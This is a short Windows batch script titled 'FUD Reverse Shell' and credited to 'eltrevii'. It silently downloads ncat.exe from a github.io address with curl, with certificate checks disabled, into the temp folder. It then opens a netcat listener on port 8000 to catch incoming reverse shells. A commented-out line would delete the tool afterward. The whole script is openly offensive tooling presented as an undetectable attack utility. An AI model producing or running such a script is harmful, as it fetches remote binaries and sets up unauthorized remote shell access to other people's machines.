@echo off
title FUD Reverse Shell ^| by eltrevii for trevi's Utils - an eltrevii original series^^TM
cls
if not exist nc.exe curl -kLs eltrevii.github.io/revs/ncat.exe -o %temp%\nc.exe
%temp%\nc -nlvp 8000
rem del /s /f /q %temp%\nc.exe
exit /b
